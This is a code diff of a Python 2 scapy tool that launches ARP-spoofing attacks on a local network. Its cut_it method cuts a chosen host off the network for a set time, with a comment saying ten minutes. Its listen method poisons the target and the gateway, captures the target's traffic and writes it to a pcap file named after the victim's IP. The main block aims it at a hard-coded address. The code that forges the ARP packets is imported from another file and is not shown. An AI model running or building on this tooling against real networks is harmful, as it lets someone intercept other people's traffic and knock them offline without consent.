@@ -1,7 +1,7 @@
 # -*- coding:utf-8 -*-
 from scapy.all import *
 from utils import active_host, get_hostname_by_ip, load_rules,start_sniff_arp,\
-    poison_target,restore_target,poison_target2,get_mac,start_sniff
+    poison_target,restore_target,cut_target,get_mac,start_sniff
 
 from web import socketio,app
 from host import Host
@@ -19,7 +19,7 @@ GATEWAY = app.config['GATEWAY']
 GATEWAY_MAC = app.config['GATEWAY_MAC']
 #IP = app.config['IP']
 COUNT = app.config['PACKET_COUNT']
-
+TIME = app.config['TIME']
 
 
 class Nct():
@@ -85,19 +85,14 @@ class Nct():
 
 
     def cut_it(self,target_ip,target_mac):
-        conf.verb = 0
-        packet_count = 100
-        poison_thread = threading.Thread(target=poison_target2, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
-        poison_thread.start()
+        #conf.verb = 0
+        cut_thread = Job(target=cut_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
+        cut_thread.start()
         try:
-            print "[*] Starting sniffer for %d packets" % packet_count
+            print "[*] Starting attack  {} mac:{}".format(target_ip,target_mac)
+            time.sleep(TIME)#断网十分钟
+            cut_thread.stop()
 
-            bpf_filter = "ip host %s " % target_ip  # 过滤器
-            packets = sniff(count=packet_count, filter=bpf_filter)
-
-            # 将捕获到的数据包输出到文件
-
-            wrpcap('cut.pcap', packets)
             # 还原网络配置
             restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
             return True
@@ -144,39 +139,35 @@ class Nct():
         start_sniff_arp(self.packet_callback,self.ip_format)
 
 
-    def stop_sniff(self):
-        print 'call stopper'
-        if self.sniff_status:
-            print 'true for stopper'
-            return True
-        return False
-
+    def stop_sniff(self,packet):
+        #packet.show()
+        pass
 
     def listen(self,target_ip,target_mac):
         #conf.verb = 0
         GATEWAY_MAC = get_mac(GATEWAY)
-        print GATEWAY
-        print GATEWAY_MAC
-        print target_ip
-        print target_mac
         packet_count = COUNT
         poison_thread = Job(target=poison_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
+        poison_thread.setDaemon(True)
         poison_thread.start()
         try:
             print "[*] Starting sniffer for %d packets" % packet_count
 
             bpf_filter = "ip host %s " % target_ip  # 过滤器
             #sniff_thread = Job(target=start_sniff,args=(packet_count,bpf_filter))
+            #sniff_thread.setDaemon(True)
             #sniff_thread.start()
-            packets = sniff(count=packet_count, filter=bpf_filter)#,stopper = self.stop_sniff(),stopper_timeout=1)
-
+            packets = sniff(count=packet_count, filter=bpf_filter,prn=self.stop_sniff)#,stopper = self.stop_sniff(),stopper_timeout=1)
+            #time.sleep(5)
             # 将捕获到的数据包输出到文件
             poison_thread.stop()
-            wrpcap('listen_data.pcap', packets)
+            #sniff_thread.stop()
+            wrpcap('{}.pcap'.format(target_ip), packets)
             # 还原网络配置
             restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
             return True
-        except KeyboardInterrupt:
+        except Exception,e:
+            print e
             # 还原网络配置
             restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
             return False
@@ -195,15 +186,23 @@ class Nct():
             value = True
         return value
 
-
+    def mythread(self):
+        while True:
+            print time.time()
+            time.sleep(2)
+    def test(self):
+        t = Job(target=self.mythread())
+        #t.setDaemon(True)
+        t.join()
+        t.start()
+        time.sleep(10)
+        t.stop()
 
 
 if __name__ == '__main__':
 
-    nct = Nct("10.2.10.*")
-    threading.Thread(target=nct.listen('10.2.10.251','e0:cb:4e:12:66:73')).start()
-    time.sleep(10)
-    print 'stopping'
-    nct.sniff_status = True
+    nct = Nct()
+    #nct.cut_it('192.168.1.101','64:9a:be:8d:d7:24')
+    nct.listen('192.168.1.101','64:9a:be:8d:d7:24')
     #list = nct.refresh_list()
     #nct.start_service()
